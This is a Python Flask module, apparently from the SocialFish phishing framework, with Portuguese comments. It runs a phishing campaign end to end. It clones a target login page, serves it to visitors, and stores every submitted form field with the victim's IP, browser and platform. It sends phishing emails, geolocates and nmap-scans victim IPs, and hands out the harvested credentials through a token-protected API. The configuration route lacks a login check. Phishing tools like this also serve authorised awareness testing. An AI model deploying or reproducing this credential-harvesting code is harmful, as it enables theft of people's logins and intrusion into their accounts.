from flask import Flask, request, render_template, jsonify, redirect, g, flash, Blueprint, current_app, url_for
from .core.scansf import nScan
from .core.clonesf import clone
from .core.genToken import genToken, genQRCode
from .core.sendMail import sendMail
from .core.tracegeoIp import tracegeoIp
from .core.genReport import genReport
from .core.report import generate_unique #>> new line
from datetime import date

import colorama
import sqlite3
from flask_login import current_user, login_user, login_required, logout_user
import os

from .auth import User
from .models import SocialFish as social_log
from .models import Creds, db, Sfmail, Professionals, Companies

socialbp = Blueprint('socialbp', __name__)

def countCreds():
    "Conta o numero de credenciais salvas no banco"
    count_creds = len(Creds.query.all())
    return count_creds

def countNotPickedUp():
    "Conta o numero de visitantes que nao foram pegos no phishing"
    count = social_log.query.first().clicks
    return count - countCreds()


# Rota para o caminho de inicializacao, onde e possivel fazer login
@socialbp.route('/neptune', methods=['GET', 'POST'])
def admin():
    # se a requisicao for get
    if request.method == 'GET':
        # se o usuario estiver logado retorna para a pagina de credenciais
        if current_user.is_authenticated:
            return redirect('/creds')
        # caso contrario retorna para a pagina de login
        else:
            return render_template('signin.html')

    # se a requisicao for post, verifica-se as credencias
    if request.method == 'POST':
        email = request.form['email']
        user = User.query.filter_by(username=email).first()
        password = request.form['password']
        if user is not None and user.verify_password(password):
            login_user(user)
            return redirect('/creds')
        flash('Invalid username or password.')
        
    return redirect('/neptune')            

# funcao onde e realizada a renderizacao da pagina para a vitima
@socialbp.route("/")
def getLogin():
    # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
    if sta == 'clone':
        agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
        clone(url, agent, beef)
        o = url.replace('://', '-')
        social_db_obj = social_log.query.first()
        social_db_obj.clicks = social_db_obj.clicks + 1
        db.session.add(social_db_obj)
        db.session.commit()
        template_path = os.path.join('fake', agent, o, 'index.html')
        return render_template(template_path)
    # caso seja a url padrao
    elif url == 'https://github.com/UndeadSec/SocialFish':
        return render_template('default.html')
    # caso seja configurada para custom
    else:
        social_db_obj = social_log.query.first()
        social_db_obj.clicks = social_db_obj.clicks + 1
        db.session.add(social_db_obj)
        db.session.commit()
        return render_template('custom.html')

# funcao onde e realizado o login por cada pagina falsa
@socialbp.route('/login', methods=['POST'])
def postData():
    if request.method == "POST":
        fields = [k for k in request.form]
        values = [request.form[k] for k in request.form]
        data = dict(zip(fields, values))
        browser = str(request.user_agent.browser)
        bversion = str(request.user_agent.version)
        platform = str(request.user_agent.platform)
        rip = str(request.remote_addr)
        d = "{:%m-%d-%Y}".format(date.today())

        creds_obj = Creds(url=url, jdoc=str(data), pdate=d, browser=browser, bversion=bversion, platform=platform, rip=rip)
        db.session.add(creds_obj)
        db.session.commit()

    return redirect(red)

# funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
@socialbp.route('/configure', methods=['POST'])
def echo():
    global url, red, sta, beef
    red = request.form['red']
    sta = request.form['status']
    beef = request.form['beef']

    if sta == 'clone':
        url = request.form['url']
    else:
        url = 'Custom'

    if len(url) > 4 and len(red) > 4:
        if 'http://' not in url and sta != '1' and 'https://' not in url:
            url = 'http://' + url
        if 'http://' not in red and 'https://' not in red:
            red = 'http://' + red
    else:
        url = 'https://github.com/UndeadSec/SocialFish'
        red = 'https://github.com/UndeadSec/SocialFish'
        
    social_db_obj = social_log.query.first()
    social_db_obj.attacks = social_db_obj.attacks + 1
    db.session.add(social_db_obj)
    db.session.commit()
    return redirect('/creds')

# pagina principal do dashboard
@socialbp.route("/creds")
@login_required
def getCreds():
    social_db_obj = social_log.query.first()
    attacks = social_db_obj.attacks
    clicks = social_db_obj.clicks
    token = social_db_obj.token
    data = Creds.query.all()
    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=token)

# pagina para envio de emails
@socialbp.route("/mail", methods=['GET', 'POST'])
@login_required
def getMail():
    if request.method == 'GET':
        data_mail = Sfmail.query.first()
        email, smtp, port = data_mail.email, data_mail.smtp, data_mail.port
        return render_template('admin/mail.html', email=email, smtp=smtp, port=port)

    if request.method == 'POST':
        subject = request.form['subject']
        email = request.form['email']
        password = request.form['password']
        recipient = request.form['recipient']
        body = request.form['body']
        smtp = request.form['smtp']
        port = request.form['port']
        sendMail(subject, email, password, recipient, body, smtp, port)

        mail = Sfmail.query.first()
        mail.email = email
        mail.smtp = smtp
        mail.port = port
        db.session.add(mail)
        db.session.commit()

        return redirect('/mail')

# Rota para consulta de log 
@socialbp.route("/single/<id>", methods=['GET'])
@login_required
def getSingleCred(id):
    try:
        credInfo = Creds.query.get(id)
        if len(credInfo) > 0:
            return render_template('admin/singlecred.html', credInfo=credInfo.jdoc)
        else:
            return "Not found"
    except:
        return "Bad parameter"

# rota para rastreio de ip
@socialbp.route("/trace/<ip>", methods=['GET'])
@login_required
def getTraceIp(ip):
    try:
        traceIp = tracegeoIp(ip)
        return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)
    except:
        return "Network Error"

# rota para scan do nmap
@socialbp.route("/scansf/<ip>", methods=['GET'])
@login_required
def getScanSf(ip):
    return render_template('admin/scansf.html', nScan=nScan, ip=ip)

# rota post para revogar o token da api
@socialbp.route("/revokeToken", methods=['POST'])
@login_required
def revokeToken():
    revoke = request.form['revoke']
    if revoke == 'yes':
        social_db_obj = social_log.query.first()
        social_db_obj.token = genToken()
        db.session.add(social_db_obj)
        db.session.commit()
        genQRCode(social_db_obj.token, revoked=True)
    return redirect('/creds')

# pagina para gerar relatorios
@socialbp.route("/report", methods=['GET', 'POST'])
@login_required
def getReport():
    if request.method == 'GET':
        urls = [url for url in db.session.query(Creds.url).distinct()]
        users = [professional for professional in db.session.query(Professionals.name)]
        companies = [company for company in db.session.query(Companies.name)]
        uniqueUrls = []
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)

    if request.method == 'POST':
        subject = request.form['subject']
        user = request.form['selectUser']
        company = request.form['selectCompany']
        date_range = request.form['datefilter']
        target = request.form['selectTarget']
        target = 'All' if target=='0' else target
        DATABASE = current_app.config['SQLALCHEMY_DATABASE_URI']
        genReport(subject, user, company, date_range, target)
        generate_unique(target)
        return redirect('/report')

# pagina para cadastro de profissionais
@socialbp.route("/professionals", methods=['GET', 'POST'])
@login_required
def getProfessionals():
    if request.method == 'GET':
        return render_template('admin/professionals.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        obs = request.form['obs']
        prof = Professionals(name=name,email=email,obs=obs)
        db.session.add(prof)
        db.session.commit()
        return redirect('/professionals')

# pagina para cadastro de empresas
@socialbp.route("/companies", methods=['GET', 'POST'])
@login_required
def getCompanies():
    if request.method == 'GET':
        return render_template('admin/companies.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        site = request.form['site']
        company = Companies(name=name, email=email, phone=phone, address=address, site=site)
        db.session.add(company)
        db.session.commit()
        return redirect('/companies')

# rota para gerenciamento de usuarios
@socialbp.route("/sfusers/", methods=['GET'])
@login_required
def getSfUsers():
    return render_template('admin/sfusers.html')

#--------------------------------------------------------------------------------------------------------------------------------
#LOGIN VIEWS

@socialbp.route('/logout')
def logout():
    logout_user()
    return 'Logged out'

#--------------------------------------------------------------------------------------------------------------------------------
# MOBILE API

# VERIFICAR CHAVE 
@socialbp.route("/api/checkKey/<key>", methods=['GET'])
def checkKey(key):
    token = social_log.query.get(1).token
    if key == token:
        status = {'status':'ok'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@socialbp.route("/api/statistics/<key>", methods=['GET'])
def getStatics(key):
    social_db_obj = social_log.query.get(1)
    token = social_db_obj.token
    if key == token:
        attacks = social_db_obj.attacks
        clicks = social_db_obj.clicks
        countC = countCreds()
        countNPU = countNotPickedUp()
        info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
    else:
        info = {'status':'bad'}
    return jsonify(info)

@socialbp.route("/api/getJson/<key>", methods=['GET'])
def getJson(key): 
    social_db_obj = social_log.query.get(1)
    token = social_db_obj.token
    if key == token:
        try:
            creds = Creds.query.all()
            listCreds = []
            if len(creds) > 0:
                for c in creds:
                    cred = {'id':c.id,
                            'url':c.url,
                            'post':c.post,
                            'date':c.date,
                            'browser':c.browser,
                            'version':c.version,
                            'os':c.os,
                            'ip':c.rip,
                            }
                    listCreds.append(cred)
            else:
                credInfo = {'status':'nothing'}
            return jsonify(listCreds)
        except:
            return "Bad parameter"
    else:
        credInfo = {'status':'bad'}
        return jsonify(credInfo)

@socialbp.route('/api/configure', methods = ['POST'])
def postConfigureApi():
    global url, red, sta, beef
    if request.is_json:
        content = request.get_json()
        social_db_obj = social_log.query.get(1)
        token = social_db_obj.token
        if content['key'] == token:
            red = content['red']
            beef = content['beef']
            if content['sta'] == 'clone':
                sta = 'clone'
                url = content['url']
            else:
                sta = 'custom'
                url = 'Custom'

            if url != 'Custom':
                if len(url) > 4:
                    if 'http://' not in url and sta != '1' and 'https://' not in url:
                        url = 'http://' + url
            if len(red) > 4:
                if 'http://' not in red and 'https://' not in red:
                    red = 'http://' + red
            else:
                red = 'https://github.com/UndeadSec/SocialFish'
            social_db_obj.attacks = social_db_obj.attacks + 1
            db.session.add(social_db_obj)
            db.session.commit()
            status = {'status':'ok'}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@socialbp.route("/api/mail", methods=['POST'])
def postSendMail():
    if request.is_json:
        content = request.get_json()
        social_db_obj = social_log.query.get(1)
        token = social_db_obj.token
        mail = Sfmail.query.get(1)
        if content['key'] == token:
            subject = content['subject']
            email = content['email']
            password = content['password']
            recipient = content['recipient']
            body = content['body']
            smtp = content['smtp']
            port = content['port']
            if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                mail.email = email
                mail.smtp = smtp
                mail.port = port
                db.session.add(mail)
                db.session.commit()
                status = {'status':'ok'}
            else:
                status = {'status':'bad','error':str(sendMail(subject, email, password, recipient, body, smtp, port))}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@socialbp.route("/api/trace/<key>/<ip>", methods=['GET'])
def getTraceIpMob(key, ip):
    social_db_obj = social_log.query.get(1)
    token = social_db_obj.token
    if key == token:
        try:
            traceIp = tracegeoIp(ip)
            return jsonify(traceIp)
        except:
            content = {'status':'bad'}
            return jsonify(content)
    else:
        content = {'status':'bad'}
        return jsonify(content)

@socialbp.route("/api/scansf/<key>/<ip>", methods=['GET'])
def getScanSfMob(key, ip):
    social_db_obj = social_log.query.get(1)
    token = social_db_obj.token
    if key == token:
        return jsonify(nScan(ip))
    else:
        content = {'status':'bad'}
        return jsonify(content)

@socialbp.route("/api/infoReport/<key>", methods=['GET'])
def getReportMob(key):
    social_db_obj = social_log.query.get(1)
    token = social_db_obj.token
    if key == token:
        urls = db.session.query(Creds.url).all()
        users = db.session.query(Professionals.name).all()
        comp = db.session.query(Companies.name).all()
        uniqueUrls = []
        professionals = []
        companies = []
        for c in comp:
            companies.append(c[0])
        for p in users:
            professionals.append(p[0])
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        info = {'urls':uniqueUrls,'professionals':professionals, 'companies':companies}
        return jsonify(info)
    else:
        return jsonify({'status':'bad'})        
